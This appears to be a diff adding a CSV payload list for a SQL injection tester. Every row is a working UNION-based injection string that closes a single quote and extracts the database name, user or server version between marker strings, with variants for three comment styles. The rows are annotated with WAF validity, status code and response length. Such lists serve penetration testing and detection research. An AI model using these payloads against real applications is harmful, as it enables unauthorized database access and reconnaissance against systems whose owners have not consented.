@@ -1,0 +1,10 @@
+payload_id,payload,context,columns,comment_style,marker_column_left,marker_column_right,extraction_expr,injection_type,valid_without_waf,status_code,response_len,notes
+p0010,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",single_quote,3,dash,2,3,database(),union,yes,200,726,
+p0011,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",single_quote,3,hash,2,3,database(),union,yes,200,726,
+p0012,"-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",single_quote,3,dashplus,2,3,database(),union,yes,200,726,
+p0013,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",single_quote,3,dash,2,3,user(),union,yes,200,726,
+p0014,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",single_quote,3,hash,2,3,user(),union,yes,200,726,
+p0015,"-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",single_quote,3,dashplus,2,3,user(),union,yes,200,726,
+p0016,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",single_quote,3,dash,2,3,version(),union,yes,200,726,
+p0017,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",single_quote,3,hash,2,3,version(),union,yes,200,726,
+p0018,"-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",single_quote,3,dashplus,2,3,version(),union,yes,200,726,
